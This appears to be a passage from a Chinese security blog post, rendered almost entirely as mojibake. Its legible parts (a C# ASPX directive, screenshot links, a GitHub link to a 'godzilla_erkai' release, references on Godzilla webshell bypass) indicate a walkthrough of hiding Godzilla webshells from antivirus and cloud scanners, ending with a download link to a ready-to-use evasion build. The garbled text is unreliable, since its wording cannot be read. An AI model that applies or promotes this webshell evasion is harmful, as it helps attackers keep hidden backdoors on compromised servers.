æ²¡æœ‰è¿™ä¸ªå°±ä¸æŠ¥äº†ã€‚  
  
ç»è¿‡æœç´¢ï¼Œè¿™ä¸ªå¤§å¸ˆå‚…å·²ç»ç»™å‡ºäº†è§£å†³æ–¹æ¡ˆã€‚  
  
https://xz.aliyun.com/t/10937  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYN6g7y3O5OX0Y20ndicDM37AkRCdtwWJNo2ym3GlBv9BJnVUoyxOiaciatQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNWSIZuKdd0vQDvYd8ib9EmPS0A5FukFFu7YIwUtrzvb29ibZySxVWiafDA/640?wx_fmt=png&from=appmsg "")  
  
æ”¾åˆ°æœ€åï¼Œå¹¶ä¸”è¦<% @language="c#" %>è¿™ä¹ˆå†™ å°±å¯ä»¥ç»•è¿‡äº†ã€‚åœ¨ä¼˜åŒ–ä¸€ä¸‹key å’Œ pass è¿›è¡Œç¼–ç ä¸€ä¸‹ï¼Œéšè—èµ·æ¥ã€‚  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNdTAsy6Ig80NCdEblr570ic7RpUtJTFXibcXu0ibXuwCDdFEcH0ndyKRow/640?wx_fmt=png&from=appmsg "")  
  
  
æ¥çœ‹ä¸€ä¸‹aliyunï¼Œè¿˜æ˜¯æŠ¥æ¶æ„ï¼Œä½†æ˜¯è¿™æ¬¡å¹¶æ²¡æœ‰ç»™å‡ºæ£€æµ‹çš„å“ªé‡Œï¼Œemmmmï¼Œå»fuzzçš„è¯ï¼Œç›¸å¯¹æ¯”è¾ƒéš¾ï¼Œå°±æ˜¯éšä¾¿åˆ é™¤ä»£ç çš„è¯ï¼Œä¼šæŠ¥æ­£å¸¸ï¼Œå› ä¸ºé˜¿é‡Œäº‘ä¼šåŠ¨æ€æ£€æµ‹ï¼Œè¯­æ³•ä¸å¯¹ï¼Œå°±ç›´æ¥æŠ¥æ­£å¸¸äº†ã€‚fuzzçš„æ—¶é—´ç›¸å¯¹é•¿ä¸€äº›ã€‚å…ˆæç½®æŠŠã€‚  
  
å¾®æ­¥  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNHesm86ibFGqWUiaAiaphpWyiclxibdpGuUnqXnY0xxA1cUOGvx05X0KSjvg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYN6KficawhZsfMxmFWrDcnZPYe3wjTyZ8w4niasG9zhwWuADOPQUDnWY5w/640?wx_fmt=png&from=appmsg "")  
  
  
360 ç«ç»’  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNTMliaRNQGrgoB1spQcADbXKIyndVxt0TAYtf54Us02vk4xibULBicLTWQ/640?wx_fmt=png&from=appmsg "")  
  
  
å…æ€éƒ½æ²¡å•¥é—®é¢˜ã€‚  
  
è¿™é‡Œæ²¡æœ‰ä½¿ç”¨å…¶ä»–å¤§å¸ˆå‚…é‚£ç§ unicodeç¼–ç çš„å…æ€ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Œè¿˜æ˜¯åœ¨jspä¸­é‡åˆ°çš„ï¼Œåœ¨dç›¾ä¸­ï¼Œåªè¦æœ‰unicodeç¼–ç ï¼Œå°±æŠ¥å¯ç–‘ï¼Œæ„Ÿè§‰ä¸æ˜¯å¾ˆå¥½ï¼Œæ‰€ä»¥å°±æ²¡æœ‰ä½¿ç”¨ã€‚å½“ç„¶ï¼Œaspxæ˜¯å¯ä»¥ä½¿ç”¨unicodeè¿›è¡Œå…æ€çš„ã€‚  
  
å¥½å¼€å§‹å¾€é‡ŒçŒï¼Œæ•´æˆåŠ¨æ€çš„ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNhxywiacb7FeIzPevAT4rkiadt3JojN6rkTLYhoRoWKWSJDibsB23hK2mw/640?wx_fmt=png&from=appmsg "")  
  
  
ç®€å•å†™ä¸€ä¸‹ï¼Œæ›¿æ¢codeå³å¯ã€‚  
  
ä¸€å¦‚æ—¢å¾€ç”Ÿæˆä¸‰ä¸ªã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNrw2JUXBBrEt4Pern2vVxaUFNKHWhGC6Z51N6ld8rMtJZULicicViaxSyA/640?wx_fmt=png&from=appmsg "")  
  
  
å¯ä»¥çœ‹åˆ°ï¼Œæ¯æ¬¡éƒ½ä¸ä¸€å®šã€‚  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNff8J061GPyHlwMEo0eFnIDZtzP4Jyq5iavJ1oLbk5qFATWHgU84FtsA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNj4WuwnyBfyGEUoichF2x8kicicmYibibcJy3cVeUyaMIY71ibjmk9XwD6rwg/640?wx_fmt=png&from=appmsg "")  
  
  
okï¼Œä½¿ç”¨ä¹Ÿæ²¡é—®é¢˜ã€‚è¿™æ ·çš„è¯ï¼Œaspxçš„å…æ€ä¹Ÿå°±å®Œæˆäº†ã€‚  
##### æ€»ç»“  
  
è¿™é‡Œä¹Ÿç®—è¿›è¡Œäº†ç®€å•çš„å…æ€ï¼Œå…¨éƒ¨è¯­è¨€é™¤äº† aliyunæ²¡æœ‰è¿‡å»ï¼Œå…¶ä»–çš„å¹³å°åŸºæœ¬å…¨è¿‡ã€‚ä¸å¾—ä¸æ‰¿è®¤ï¼Œaliyunæ˜¯å¼ºçš„ã€‚php ç®€å•ä½¿ç”¨äº†ä¸€ä¸‹ç±»ã€å¯¹å…³é”®å­—è¿›è¡Œäº†chrçš„æ›¿æ¢ï¼Œjspé‡å†™äº†base64ç¼–ç æ–¹æ³•ï¼Œé‡å†™äº†åŠ è½½aesï¼Œä½¿ç”¨çš„åå°„å‹æ–¹æ³•å†™çš„ï¼Œå¯¹å…³é”®å­—è¿›è¡Œæ›¿æ¢ï¼Œaspä½¿ç”¨äº†chrè¿›è¡Œæ›¿æ¢å…³é”®å­—æ‹¼æ¥å­—ç¬¦ä¸²ï¼Œæ¢äº†ä¸€ä¸‹å‡½æ•°çš„å†™æ³•ï¼Œaspxå¯¹å…³é”®å‡½æ•°æ‹†å¼€é‡å†™ï¼Œå¹¶ä¸”å°†å…³é”®æŸ¥æ€å‡½æ•°é‡æ–°å†™äº†ä¸€ä¸‹ï¼Œå¯¹å…³é”®å­—base64ç¼–ç ã€‚  
##### ä¸‹ä¸ªç‰ˆæœ¬  
  
1.1ç‰ˆæœ¬æ·»åŠ æœ¨é©¬çš„å…æ€ï¼Œå…¨è¯­è¨€éƒ½åšå¥½äº†ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰æ”¹æµé‡ä»¥åŠåŠ å¯†æ–¹å¼ï¼Œåªæ˜¯åšäº†ä¼ªè£…ï¼Œ  
  
åé¢éœ€è¦åšçš„ï¼šä¿®æ”¹ä¸€ä¸‹åŠ å¯†æ–¹å¼ï¼Œè¿™æ ·çš„è¯ä¼šæ›´å¥½ä¸€ç‚¹ã€‚è¿˜æœ‰å°±æ˜¯messageå…¶å®æ˜¯å›ºå®šçš„ï¼Œå¸Œæœ›èƒ½è®©ä»–åŠ¨èµ·æ¥ã€‚è¿˜æœ‰ä¼ é€’çš„å‚æ•° page=1&size=10 æ˜¯å›ºå®šçš„ï¼Œè®©ä»–ä¹ŸåŠ¨èµ·æ¥ã€‚  
##### ä¸‹è½½ã€ä½¿ç”¨  
  
ä»€ä¹ˆï¼Œä½ è¯´çœ‹ä¸æ˜ç™½ã€ä¸æƒ³åŠ¨æ‰‹ã€å¤ªéº»çƒ¦ï¼Œæ²¡äº‹ï¼Œå»ä¸‹è½½å°±å¯ä»¥äº†ã€‚ https://github.com/Bohemiana/godzilla_erkai release 1.1 å…æ€ç‰ˆæœ¬  
  
ä¸Šä¸ªç‰ˆæœ¬ç”±äºå†™çš„æ¯”è¾ƒèœï¼Œæ²¡å¥½æ„æ€è·Ÿå¤§å®¶è¦starï¼Œè¿™æ¬¡è‡ªæˆ‘æ„Ÿè§‰è¿˜è¡Œï¼Œä¹Ÿç®—æ˜¯å®æˆ˜èƒ½ç”¨äº†ï¼Œè·Ÿå¤§å®¶æµ…æµ…è¦ä¸€ä¸‹ å¦‚æœæ„Ÿè§‰è¿˜è¡Œï¼Œå¤§å®¶å¸®å¿™ç‚¹ç‚¹star  
##### è‡´è°¢  
  
æœ€åæ„Ÿè°¢æ‚¨è¯»åˆ°ç°åœ¨ï¼Œè¿™ç¯‡æ–‡ç« åŒ†å¿™æ„æˆè‚¯å®šæœ‰ä¸å‘¨åˆ°æˆ–æè¿°ä¸æ­£ç¡®çš„åœ°æ–¹ï¼ŒæœŸå¾…ä¸šç•Œå¸ˆå‚…ä»¬ç”¨å„ç§æ–¹å¼æŒ‡æ­£å‹˜è¯¯ã€‚  
##### å‚è€ƒ  
```
https://github.com/BeichenDream/Godzilla Â  Â  Â  Â  Â  Â åŸç‰ˆå“¥æ–¯æ‹‰
https://github.com/Tas9er/ByPassGodzilla Â  ByPassGodzilla
https://xz.aliyun.com/t/2758 Â  Â  Â  Â  Â  Â  Â  åˆ©ç”¨åŠ¨æ€äºŒè¿›åˆ¶åŠ å¯†å®ç°æ–°å‹ä¸€å¥è¯æœ¨é©¬ä¹‹.NETç¯‡
https://xz.aliyun.com/t/10937 Â  Â  Â  Â  Â  Â  Â æµ‹è¯•å‡ ç§å®æˆ˜æˆåŠŸè¿‡çš„webshellçš„å…æ€æ–¹å¼
https://xz.aliyun.com/t/11368 Â  Â  Â  Â  Â  Â  Â å®æˆ˜åˆ†ææŸçº¢é˜Ÿé­”æ”¹å“¥æ–¯æ‹‰Webshell
https://uuzdaisuki.com/2021/05/12/webshell%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6jsp%E7%AF%87/ Â  Â  Â  Â  Â  Â  Â  Â  Â  webshellå…æ€ç ”ç©¶jspç¯‡
https://www.secpulse.com/archives/193780.html Â  Â  Â  Â ç®€å•æ“ä½œå®ç°å†°èjsp webshell é˜¿é‡Œäº‘å…æ€Â 

```  
##### æ€»ç»“  
> emmm å¤ªèœäº† ä¸€ç›´åœ¨è·¯ä¸Š  
  
  
